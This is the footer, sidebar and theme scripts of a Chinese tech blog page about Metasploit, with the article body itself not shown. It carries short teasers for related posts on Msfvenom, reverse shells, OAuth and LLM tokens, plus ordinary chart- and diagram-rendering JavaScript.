许可协议。转载请注明来源 <a href="https://blog.tbf1211.xx.kg" target="_blank">1024 维度</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a><a class="post-meta__tags" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a><a class="post-meta__tags" href="/tags/2025/">2025</a><a class="post-meta__tags" href="/tags/Metasploit/">Metasploit</a></div><div class="post-share"><div class="social-share" data-image="/img/cover/default_cover-11.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/1bd89b02cd88/" title="大型语言模型中的Token详解：数据、处理与意义"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-21.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">大型语言模型中的Token详解：数据、处理与意义</div></div><div class="info-2"><div class="info-item-1"> Token 是大型语言模型 (Large Language Models, LLMs) 处理文本的基本单位。它不是传统意义上的“词”，而是模型将人类可读的文字序列（如句子、段落）切分、编码并最终用于学习和生成文本的离散符号表示。理解 Token 的概念对于深入了解 LLMs 的工作原理、能力边界以及成本核算至关重要。  核心思想：LLMs 不直接处理原始文本，而是将其分解为一系列经过特殊编码的 Token。这些 Token 构成了模型输入和输出的最小单元，并直接影响模型的性能、效率和成本。   一、什么是 Token？在自然语言处理 (NLP) 领域，尤其是在 LLMs 中，Token 是指模型进行训练和推理时所使用的文本片段。它可能是：  一个完整的词 (Word)：例如 “cat”, “run”。 一个词的一部分 (Subword)：例如 “un”, “believe”, “able” 组合成 “unbelievable”。 一个标点符号 (Punctuation)：例如 “.”, “,”, “!”。 一个特殊符号或控制字符 (Special Token)：例如 [CLS]...</div></div></div></a><a class="pagination-related" href="/21e140c78f80/" title="大型语言模型如何理解人类文字：从Token到语义表征"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-01.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">大型语言模型如何理解人类文字：从Token到语义表征</div></div><div class="info-2"><div class="info-item-1"> 大型语言模型 (Large Language Models, LLMs) 在处理和生成人类语言方面展现出了前所未有的能力，这引发了一个核心问题：它们是如何“理解”人类文字的？这种理解并非传统意义上的认知或意识，而是通过对海量文本数据中统计模式和语义关联的深度学习，构建出高度复杂的语言表征。  核心思想：LLMs 将人类语言转化为高维数学向量，并通过 Transformer 架构中的注意力机制，捕捉词语、句子乃至篇章间的复杂关联，从而在统计层面模拟人类对语言的理解和生成。   一、基础构建模块：从文本到向量LLMs 的“理解”始于将人类可读的文字转化为机器可处理的数值形式。这一过程主要依赖于分词 (Tokenization) 和词嵌入 (Word Embeddings)。 1.1 分词 (Tokenization)分词是将连续的文本序列切分成有意义的最小单位——Token 的过程。Token 可以是一个词、一个子词 (subword) 甚至一个字符。  词级别分词 (Word-level Tokenization)：以空格或标点符号为界，将文本切分为词。简单直观，但词汇量庞大，且...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/1c9fa79b93e5/" title="Msfvenom 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-31.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-26</div><div class="info-item-2">Msfvenom 详解</div></div><div class="info-2"><div class="info-item-1"> Msfvenom 是 Metasploit 框架中的一个强大而独立的命令行工具，它结合了 msfpayload（载荷生成器）和 msfencode（编码器）的功能，旨在生成各种格式的恶意载荷（Payload）并对其进行编码，以规避安全检测。它是渗透测试人员和红队成员创建自定义后门和绕过防御机制的利器。  核心思想：将攻击载荷（Shellcode）和输出格式（如 EXE、ELF、ASPX 等）分离，允许用户自由组合并按需编码，生成高度定制化的恶意文件。   一、Msfvenom 简介1.1 什么是 Msfvenom？msfvenom 是一个命令行工具，属于 Metasploit Framework 的一部分。它的主要功能是：  载荷生成 (Payload Generation)：创建各种操作系统（Windows, Linux, macOS, Android 等）和架构（x86, x64 等）的恶意载荷。 编码 (Encoding)：对生成的载荷进行编码，以尝试绕过杀毒软件的签名检测或处理特殊字符（如 NUL \x00）。 格式化 (Formatting)：将生成的载荷输出为多种文...</div></div></div></a><a class="pagination-related" href="/08a7bab723f9/" title="Metasploit exploit&#x2F;multi&#x2F;handler 模块详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-20.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-14</div><div class="info-item-2">Metasploit exploit&#x2F;multi&#x2F;handler 模块详解</div></div><div class="info-2"><div class="info-item-1"> exploit/multi/handler 是 Metasploit 框架中一个极其重要且应用广泛的模块。它本身并不是一个漏洞利用模块，而是一个通用的监听器（Listener），用于接收由 Metasploit 或 msfvenom 生成的各种 Payload 发起的反向连接（Reverse Shell）。它提供了一个灵活且强大的平台，用于管理渗透测试过程中获取的 Shell 会话，特别是 Meterpreter 会话。  核心思想：提供一个通用的、模块化的监听接口，等待远程目标系统主动连接，从而建立一个控制通道。它与用于生成Payload的msfvenom紧密配合，实现无缝的端到端攻击链。   一、exploit/multi/handler 简介1.1 什么是 exploit/multi/handler？exploit/multi/handler 是 Metasploit 中的一个混合型模块 (Auxiliary&#x2F;Exploit)。它被归类为 exploit，因为它最终目的是“利用”系统并获得 Shell，但它实际上不包含任何漏洞利用代码。它的主要功能是：  监听反...</div></div></div></a><a class="pagination-related" href="/1046db413419/" title="Reverse TCP Shell 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-05.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-02-07</div><div class="info-item-2">Reverse TCP Shell 详解</div></div><div class="info-2"><div class="info-item-1"> Reverse TCP Shell (反向 TCP Shell) 是一种在渗透测试和恶意软件领域中广泛使用的技术，它允许攻击者在受害机器上获得一个交互式命令行会话。与传统的正向连接 Shell (Bind Shell) 不同，反向 Shell 的连接方向是从受害机器到攻击机器，这使得它在穿越防火墙和 NAT 设备方面具有显著优势。  核心思想：攻击者在其机器上设置一个监听器，等待受害机器主动发起连接，从而绕过目标网络对入站连接的限制。   一、Shell 简介在计算机系统中，Shell (命令行解释器) 是用户与操作系统内核进行交互的接口。通过 Shell，用户可以输入命令来执行程序、管理文件和系统资源等。 在渗透测试中，获取目标系统的 Shell 权限是至关重要的一步，它意味着攻击者可以在目标机器上执行任意命令。 1.1 Shell 的分类 命令行 Shell (Command Shell)：  提供基本的命令行交互界面，如 Windows 的 cmd.exe 或 PowerShell，Linux 的 bash 或 sh。 功能相对简单，通常需要手动输入命令。   高级 Sh...</div></div></div></a><a class="pagination-related" href="/fc0a62ae56f9/" title="OAuth2.0详解：现代授权框架的核心原理与应用"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-29.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-09</div><div class="info-item-2">OAuth2.0详解：现代授权框架的核心原理与应用</div></div><div class="info-2"><div class="info-item-1"> OAuth 2.0（Open Authorization）是一个开放标准，定义了一套授权流程，允许用户（资源所有者）授权第三方应用访问他们在另一个服务提供者（授权服务器）上的受保护资源（资源服务器），而无需将自己的用户名和密码直接提供给第三方应用。它主要解决的是委托授权的问题，即“我授权应用A去访问我在服务B上的某些数据”。  核心区分：OAuth 2.0 是一个授权（Authorization）框架，而不是用来做认证（Authentication）。尽管它常常与认证机制（如 OpenID Connect）结合使用，但其核心职责是授予对资源的访问权限，而非验证用户身份。   一、OAuth 2.0 产生的背景与解决的问题在 OAuth 出现之前，如果一个第三方应用需要访问用户在其他服务（如 Google 相册、GitHub 代码库）上的数据，用户通常需要将自己的账号密码直接告知第三方应用。这种做法带来了严重的安全和便捷性问题：  凭据泄露风险：第三方应用一旦被攻破，或恶意使用，用户的完整凭据就会泄露，导致所有关联服务面临风险。 权限过大：第三方应用获得的是用户的完全控制权，无法...</div></div></div></a><a class="pagination-related" href="/902d004f5ccc/" title="浏览器指纹 (Browser Fingerprinting) 详解"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-03.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">浏览器指纹 (Browser Fingerprinting) 详解</div></div><div class="info-2"><div class="info-item-1"> 浏览器指纹 (Browser Fingerprinting) 是一种用于识别或追踪用户在线行为的技术，即使在用户清除了 cookies、使用无痕模式甚至更换 IP 地址之后，它也能尝试标识出唯一的用户或设备。与 cookies 不同，浏览器指纹不是存储在用户设备上的数据，而是通过收集用户浏览器的各种配置和设置信息来生成的。  “你的浏览器就像你的手纹一样，看似普通，却独一无二。”   一、什么是浏览器指纹？浏览器指纹是指网站或在线服务通过收集用户浏览器和设备的大量可公开信息（如操作系统、浏览器类型和版本、屏幕分辨率、字体、插件、MIME 类型、时区、语言设置、GPU 信息、Canvas 渲染结果、AudioContext 信息等），并将这些信息综合起来生成一个近似唯一的“指纹”，从而在一定概率上识别单个用户或设备的技术。 这个“指纹”的强大之处在于其持久性和隐蔽性，用户很难通过常规手段进行清除或规避。 二、浏览器指纹的工作原理网站通过 JavaScript 或其他客户端脚本，在用户访问时执行一系列操作来获取其浏览器和设备特征。这些特征包括： 1. HTTP 请求头信息 (HTT...</div></div></div></a><a class="pagination-related" href="/ffc98223e029/" title="OAuth2.0 PKCE机制详解：提升公共客户端安全性的标准实践"><img class="cover" src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-23.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-02</div><div class="info-item-2">OAuth2.0 PKCE机制详解：提升公共客户端安全性的标准实践</div></div><div class="info-2"><div class="info-item-1"> OAuth 2.0 (Open Authorization 2.0) 是一种授权框架，允许第三方应用程序在不获取用户凭据的情况下访问用户在另一个服务商的受保护资源。然而，传统的 OAuth 2.0 授权码流在某些客户端类型（如公共客户端，Public Clients）中存在安全隐患。为了解决这些问题，PKCE（Proof Key for Code Exchange by OAuth Public Clients） 机制应运而生。  核心思想：PKCE 通过在授权码流中引入一个动态生成的密钥对，有效防止了授权码被恶意截取后被非法使用的风险，极大增强了公共客户端（如移动应用、单页应用）的安全性。    一、为什么需要 PKCE？公共客户端面临的挑战传统的 OAuth 2.0 授权码流 (Authorization Code Flow) 是最安全、最推荐的流程，它通过将授权码 (Authorization Code) 发送给客户端，然后客户端使用授权码和客户端秘钥 (Client Secret) 交换访问令牌 (Access Token)。 然而，这种传统的授权码流在用于公共客户端 ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/loading.gif" data-lazy-src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">TeaTang</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">443</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">225</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">80</div></a></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/teatang"><i class="fab fa-github"></i><span>GitHub主页</span></a><div class="card-info-social-icons"><a class="social-icon" href="mailto:tea.tang1211@gmail.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网站更多功能即将上线，敬请期待！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81Metasploit-%E7%AE%80%E4%BB%8B"><span class="toc-text">一、Metasploit 简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-1-%E4%BB%80%E4%B9%88%E6%98%AF-Metasploit%EF%BC%9F"><span class="toc-text">1.1 什么是 Metasploit？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-2-Metasploit-%E7%9A%84%E5%8F%91%E5%B1%95%E5%8E%86%E5%8F%B2"><span class="toc-text">1.2 Metasploit 的发展历史</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-3-Metasploit-%E7%9A%84%E4%B8%BB%E8%A6%81%E7%89%88%E6%9C%AC"><span class="toc-text">1.3 Metasploit 的主要版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Metasploit-%E6%A1%86%E6%9E%B6%E7%9A%84%E6%A0%B8%E5%BF%83%E7%BB%84%E4%BB%B6"><span class="toc-text">二、Metasploit 框架的核心组件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E6%A8%A1%E5%9D%97%E7%B1%BB%E5%9E%8B-Modules"><span class="toc-text">2.1 模块类型 (Modules)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2-%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%AF%E6%8C%81"><span class="toc-text">2.2 数据库支持</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81Metasploit-%E6%8E%A7%E5%88%B6%E5%8F%B0-msfconsole"><span class="toc-text">三、Metasploit 控制台 (msfconsole)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#3-1-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">3.1 常用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-2-%E5%9F%BA%E6%9C%AC%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E7%A4%BA%E4%BE%8B-%E4%BB%A5-EternalBlue-%E4%B8%BA%E4%BE%8B"><span class="toc-text">3.2 基本渗透流程示例 (以 EternalBlue 为例)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81Meterpreter-%E9%AB%98%E7%BA%A7%E5%90%8E%E6%B8%97%E9%80%8F-Shell"><span class="toc-text">四、Meterpreter - 高级后渗透 Shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#4-1-Meterpreter-%E7%9A%84%E7%89%B9%E7%82%B9"><span class="toc-text">4.1 Meterpreter 的特点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-2-%E5%B8%B8%E7%94%A8-Meterpreter-%E5%91%BD%E4%BB%A4"><span class="toc-text">4.2 常用 Meterpreter 命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81Metasploit-%E7%9A%84%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95%E4%B8%8E%E5%8A%9F%E8%83%BD"><span class="toc-text">五、Metasploit 的高级用法与功能</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#5-1-Evasion-%E8%A7%84%E9%81%BF"><span class="toc-text">5.1 Evasion (规避)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-2-Sessions-%E4%BC%9A%E8%AF%9D%E7%AE%A1%E7%90%86"><span class="toc-text">5.2 Sessions (会话管理)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-3-Resource-Scripts-%E8%B5%84%E6%BA%90%E8%84%9A%E6%9C%AC"><span class="toc-text">5.3 Resource Scripts (资源脚本)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-4-Msfvenom"><span class="toc-text">5.4 Msfvenom</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-5-Post-Exploitation-%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-text">5.5 Post-Exploitation (后渗透)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81Metasploit-%E7%9A%84%E5%B1%80%E9%99%90%E6%80%A7%E4%B8%8E%E9%A3%8E%E9%99%A9"><span class="toc-text">六、Metasploit 的局限性与风险</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E6%80%BB%E7%BB%93"><span class="toc-text">七、总结</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/0c48c5fa5942/" title="CFFI (C Foreign Function Interface for Python) 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-06.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CFFI (C Foreign Function Interface for Python) 详解"/></a><div class="content"><a class="title" href="/0c48c5fa5942/" title="CFFI (C Foreign Function Interface for Python) 详解">CFFI (C Foreign Function Interface for Python) 详解</a><time datetime="2025-12-23T22:24:00.000Z" title="发表于 2025-12-24 06:24:00">2025-12-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/03cebd3cc28a/" title="行为驱动开发 (BDD) 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-32.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="行为驱动开发 (BDD) 详解"/></a><div class="content"><a class="title" href="/03cebd3cc28a/" title="行为驱动开发 (BDD) 详解">行为驱动开发 (BDD) 详解</a><time datetime="2025-12-21T22:24:00.000Z" title="发表于 2025-12-22 06:24:00">2025-12-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/7bb082434be0/" title="测试驱动开发 (TDD) 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-07.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="测试驱动开发 (TDD) 详解"/></a><div class="content"><a class="title" href="/7bb082434be0/" title="测试驱动开发 (TDD) 详解">测试驱动开发 (TDD) 详解</a><time datetime="2025-12-19T22:24:00.000Z" title="发表于 2025-12-20 06:24:00">2025-12-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/24ffc0bedb41/" title="IPFS (InterPlanetary File System) 详解"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-01.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="IPFS (InterPlanetary File System) 详解"/></a><div class="content"><a class="title" href="/24ffc0bedb41/" title="IPFS (InterPlanetary File System) 详解">IPFS (InterPlanetary File System) 详解</a><time datetime="2025-12-16T22:24:00.000Z" title="发表于 2025-12-17 06:24:00">2025-12-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/974825c9c64f/" title="L7 负载均衡详解 (Layer 7 Load Balancing Explained)"><img src="/img/loading.gif" data-lazy-src="/img/cover/default_cover-13.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="L7 负载均衡详解 (Layer 7 Load Balancing Explained)"/></a><div class="content"><a class="title" href="/974825c9c64f/" title="L7 负载均衡详解 (Layer 7 Load Balancing Explained)">L7 负载均衡详解 (Layer 7 Load Balancing Explained)</a><time datetime="2025-12-14T22:24:00.000Z" title="发表于 2025-12-15 06:24:00">2025-12-15</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/cover/default_cover-11.jpg);"><div class="footer-flex"><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">我的轨迹</div><div class="footer-flex-content"><a href="/archives/2023/" target="_blank" title="📌 2023">📌 2023</a><a href="/archives/2024/" target="_blank" title="❓ 2024">❓ 2024</a><a href="/archives/2025/" target="_blank" title="🚀 2025">🚀 2025</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">维度</div><div class="footer-flex-content"><a href="/categories/" target="_blank" title="分类">分类</a><a href="/tags/" target="_blank" title="标签">标签</a><a href="/categories/" target="_blank" title="时间线">时间线</a></div></div></div><div class="footer-flex-items"><div class="footer-flex-item"><div class="footer-flex-title">其他</div><div class="footer-flex-content"><a href="/shuoshuo" target="_blank" title="说说">说说</a></div></div></div></div><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2023 - 2025 By TeaTang</span><span class="framework-info"><span class="footer-separator">|</span><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.7/dist/fancybox/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@5.2.0/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@19.1.3/dist/lazyload.iife.min.js"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const config = mermaidSrc.dataset.config ? JSON.parse(mermaidSrc.dataset.config) : {}
      if (!config.theme) {
        config.theme = theme
      }
      const mermaidThemeConfig = `%%{init: ${JSON.stringify(config)}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (true) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.12.2/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script><script>(() => {
  const applyThemeDefaultsConfig = theme => {
    if (theme === 'dark-mode') {
      Chart.defaults.color = "rgba(255, 255, 255, 0.8)"
      Chart.defaults.borderColor = "rgba(255, 255, 255, 0.2)"
      Chart.defaults.scale.ticks.backdropColor = "transparent"
    } else {
      Chart.defaults.color = "rgba(0, 0, 0, 0.8)"
      Chart.defaults.borderColor = "rgba(0, 0, 0, 0.1)"
      Chart.defaults.scale.ticks.backdropColor = "transparent"
    }
  }

  // Recursively traverse the config object and automatically apply theme-specific color schemes
  const applyThemeConfig = (obj, theme) => {
    if (typeof obj !== 'object' || obj === null) return

    Object.keys(obj).forEach(key => {
      const value = obj[key]
      // If the property is an object and has theme-specific options, apply them
      if (typeof value === 'object' && value !== null) {
        if (value[theme]) {
          obj[key] = value[theme] // Apply the value for the current theme
        } else {
          // Recursively process child objects
          applyThemeConfig(value, theme)
        }
      }
    })
  }

  const runChartJS = ele => {
    window.loadChartJS = true

    Array.from(ele).forEach((item, index) => {
      const chartSrc = item.firstElementChild
      const chartID = item.getAttribute('data-chartjs-id') || ('chartjs-' + index) // Use custom ID or default ID
      const width = item.getAttribute('data-width')
      const existingCanvas = document.getElementById(chartID)

      // If a canvas already exists, remove it to avoid rendering duplicates
      if (existingCanvas) {
          existingCanvas.parentNode.remove()
      }

      const chartDefinition = chartSrc.textContent
      const canvas = document.createElement('canvas')
      canvas.id = chartID

      const div = document.createElement('div')
      div.className = 'chartjs-wrap'

      if (width) {
        div.style.width = width
      }

      div.appendChild(canvas)
      chartSrc.insertAdjacentElement('afterend', div)

      const ctx = document.getElementById(chartID).getContext('2d')

      const config = JSON.parse(chartDefinition)

      const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark-mode' : 'light-mode'

      // Set default styles (initial setup)
      applyThemeDefaultsConfig(theme)

      // Automatically traverse the config and apply dual-mode color schemes
      applyThemeConfig(config, theme)

      new Chart(ctx, config)
    })
  }

  const loadChartJS = () => {
    const chartJSEle = document.querySelectorAll('#article-container .chartjs-container')
    if (chartJSEle.length === 0) return

    window.loadChartJS ? runChartJS(chartJSEle) : btf.getScript('https://cdn.jsdelivr.net/npm/chart.js@4.5.1/dist/chart.umd.min.js').then(() => runChartJS(chartJSEle))
  }

  // Listen for theme change events
  btf.addGlobalFn('themeChange', loadChartJS, 'chartjs')
  btf.addGlobalFn('encrypt', loadChartJS, 'chartjs')

  window.pjax ? loadChartJS() : document.addEventListener('DOMContentLoaded', loadChartJS)
})()</script></div><script data-pjax src="/self/btf.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/fireworks.min.js"></script><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="ture"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-fluttering-ribbon.min.js"></script><script id="canvas_nest" defer="defer" color="0,200,200" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js" defer="defer"></script><script>document.addEventListener('DOMContentLoaded', () => {
  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]

  window.pjax = new Pjax({
    elements: 'a:not([target="_blank"])',
    selectors: pjaxSelectors,
    cacheBust: false,
    analytics: false,
    scrollRestoration: false
  })

  const triggerPjaxFn = (val) => {
    if (!val) return
    Object.values(val).forEach(fn => {
      try {
        fn()
      } catch (err) {
        console.debug('Pjax callback failed:', err)
      }
    })
  }

  document.addEventListener('pjax:send', () => {
    // removeEventListener
    btf.removeGlobalFnEvent('pjaxSendOnce')
    btf.removeGlobalFnEvent('themeChange')

    // reset readmode
    const $bodyClassList = document.body.classList
    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')

    triggerPjaxFn(window.globalFn.pjaxSend)
  })

  document.addEventListener('pjax:complete', () => {
    btf.removeGlobalFnEvent('pjaxCompleteOnce')
    document.querySelectorAll('script[data-pjax]').forEach(item => {
      const newScript = document.createElement('script')
      const content = item.text || item.textContent || item.innerHTML || ""
      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
      newScript.appendChild(document.createTextNode(content))
      item.parentNode.replaceChild(newScript, item)
    })

    triggerPjaxFn(window.globalFn.pjaxComplete)
  })

  document.addEventListener('pjax:error', e => {
    if (e.request.status === 404) {
      true
        ? pjax.loadUrl('/404.html')
        : window.location.href = e.request.responseURL
    }
  })
